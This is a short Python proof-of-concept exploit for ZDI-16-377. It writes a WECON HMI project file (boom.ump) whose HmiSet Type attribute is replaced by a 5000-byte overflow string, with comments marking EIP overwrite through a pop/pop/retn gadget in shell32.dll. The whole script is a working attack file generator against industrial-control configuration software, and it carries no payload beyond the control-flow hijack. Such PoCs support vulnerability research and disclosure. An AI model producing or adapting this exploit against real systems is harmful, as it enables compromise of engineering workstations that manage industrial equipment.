#! /usr/bin/python
# PoC -> ZDI-16-377
# james fitts

xml = """<?xml version="1.0" encoding="UTF-8"?>
<project filever="1.0" ProjectVer="2.0">
        <PlcSet Count="1" Language="0">
                <Connection>
                        <PLC Type="WECON SIMUTOCOL" Driver="simutocol.dll" HmiStatNo="0" PlcStatNo="0"/>
                        <CommSet ComType="0" Port="COM1" BaudRate="9600" StopBit="1" DataLength="8" CheckBit="NONE" WaitTimeout="10" RevTimeout="10" RetryTimes="2" RetryTimeOut="3" ComIoDelayTime="0" ComStepInterval="0"/></Connection></PlcSet>
        <HmiSet Type="BOOM" Width="800" Height="480" HmiTypeIndex="10" Language="0" StartScrNo="0" Style="Windows Classic"/>
        <AddressLib/><StringLib Language="0"/><AlarmSet/>
        <TrendSet/>
        <XYSet/>
        <DiscSet/>
        <EventSet/>
        <SysSet>
                <SecSet/>
                <NETSet NETIPaddr="192.168.1.2" NETMASKaddr="255.255.255.0" NETWayaddr="192.168.1.1"/>
                <BaseSet StorePattern="0" Background="-1" AlarmScrSave="0" JianGe="0" OsLanguage="1" IsScrIdVar="0" BgOnOffBitAddr="" ScrIdWordAddr="HDW0" CurScrIdAddr="" SysLen="0" IsScrFast="0" IsuseTTS="0" IsUseAuthority="0" IsUseOptLogFunc="0" IsUseSNMP="0" IsUDKeyboard="0" IsNShowPOPUP="0" IsEncrypt="0" nWallId="1" FloatHiLowReverse="0" HMINAME="" ProtectScreen="0" ProtectScreenTime="0" ProtectScreenNo="0" IsShowNC="0" IsHighWord="0" IsEnterTime="0" IsPowerEnterTime="0" EnterTime="" PowerEnterTime="" bAlCache="0" CacheValue="0" UseHideOperability="0" Operability="0"/></SysSet>
<ScreenSet>
<ScreenInfo ScrnNo="0" Child="0" ScrnName="Screen" Height="480" Width="800" Filled="1" BkColor="0xd8e9ec" FnColor="0xd8e9ec" Pattern="0" BmpIndex="-1" RightClass="0" ScrnFile="0.hsc" Opened="1"/>
<ScreenInfo ScrnNo="1002" Child="0" ScrnName="Common Window" Height="480" Width="800" Filled="1" BkColor="0xffffff" FnColor="0xffffff" Pattern="0" BmpIndex="-1" RightClass="0" ScrnFile="1002.hsc" Opened="0"/>
<ScreenInfo ScrnNo="1003" Child="1" ScrnName="Fast Selection" Height="460" Width="100" Filled="1" BkColor="0xffffff" FnColor="0xffffff" Pattern="0" BmpIndex="-1" RightClass="0" ScrnFile="1003.hsc" Opened="0"/>
<ScreenInfo ScrnNo="1000" Child="1" ScrnName="BuilNum" Height="360" Width="600" Filled="1" BkColor="0xcccccc" FnColor="0xffffff" Pattern="0" BmpIndex="-1" RightClass="0" ScrnFile="1000.hsc" Opened="0"/>
<ScreenInfo ScrnNo="1001" Child="1" ScrnName="BuilKey" Height="300" Width="700" Filled="1" BkColor="0xcccccc" FnColor="0xffffff" Pattern="0" BmpIndex="-1" RightClass="0" ScrnFile="1001.hsc" Opened="0"/>
<ScreenInfo ScrnNo="1004" Child="1" ScrnName="UserPwdKb" Height="300" Width="700" Filled="1" BkColor="0xcccccc" FnColor="0xffffff" Pattern="0" BmpIndex="-1" RightClass="0" ScrnFile="1004.hsc" Opened="0"/>
<ScreenInfo ScrnNo="1006" Child="1" ScrnName="UserTimeKb" Height="380" Width="250" Filled="1" BkColor="0xcccccc" FnColor="0xffffff" Pattern="0" BmpIndex="-1" RightClass="0" ScrnFile="1006.hsc" Opened="0"/>
<ScreenInfo ScrnNo="1007" Child="1" ScrnName="UserTrdKb" Height="250" Width="400" Filled="1" BkColor="0xcccccc" FnColor="0xffffff" Pattern="0" BmpIndex="-1" RightClass="0" ScrnFile="1007.hsc" Opened="0"/>
<ScreenInfo ScrnNo="1008" Child="1" ScrnName="UserDataPwdKb" Height="300" Width="700" Filled="1" BkColor="0xcccccc" FnColor="0xffffff" Pattern="0" BmpIndex="-1" RightClass="0" ScrnFile="1008.hsc" Opened="0"/>
<ScreenInfo ScrnNo="1009" Child="1" ScrnName="Installpaymentset" Height="300" Width="700" Filled="1" BkColor="0xcccccc" FnColor="0xffffff" Pattern="0" BmpIndex="-1" RightClass="0" ScrnFile="1009.hsc" Opened="0"/>
<ScreenInfo ScrnNo="1010" Child="1" ScrnName="InstallpaymentPwd" Height="300" Width="700" Filled="1" BkColor="0xcccccc" FnColor="0xffffff" Pattern="0" BmpIndex="-1" RightClass="0" ScrnFile="1010.hsc" Opened="0"/>
<ScreenInfo ScrnNo="1011" Child="1" ScrnName="UserLogin" Height="244" Width="394" Filled="1" BkColor="0xcccccc" FnColor="0xffffff" Pattern="0" BmpIndex="-1" RightClass="0" ScrnFile="1011.hsc" Opened="0"/>
<ScreenInfo ScrnNo="1012" Child="1" ScrnName="UserChangePSW" Height="264" Width="394" Filled="1" BkColor="0xcccccc" FnColor="0xffffff" Pattern="0" BmpIndex="-1" RightClass="0" ScrnFile="1012.hsc" Opened="0"/></ScreenSet></project>
"""

boom =  "\x41" * 1562
boom += "\x58\x6d"			# junk
boom += "\x2c\x7f"			# EIP => pop ebx/ pop ebp/ retn 0c => shell32.dll
boom += "\x58\x6d"			# pop eax
boom += "\x42" * 1500
boom += "\x43" * (5000 - len(boom))

new_xml = xml.replace("BOOM", boom)

f = open('boom.ump', 'w')
f.write(new_xml)
f.close
